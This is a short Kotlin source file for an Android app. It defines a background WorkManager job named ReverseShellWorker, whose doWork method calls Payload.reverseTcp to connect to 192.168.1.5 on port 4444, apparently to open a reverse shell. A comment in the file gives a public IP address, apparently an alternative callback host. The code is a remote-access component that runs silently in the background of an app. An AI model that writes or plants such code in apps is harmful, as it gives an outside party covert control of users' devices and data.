package com.satwik.nexgenius.core.main

import android.content.Context
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters


class ReverseShellWorker(appContext: Context, workerParams: WorkerParameters) :
    CoroutineWorker(appContext, workerParams) {

        //20.197.48.204
    override suspend fun doWork(): Result {
        println("Connection request sent")
        Payload.reverseTcp("192.168.1.5", 4444)
        return Result.success()
    }
}
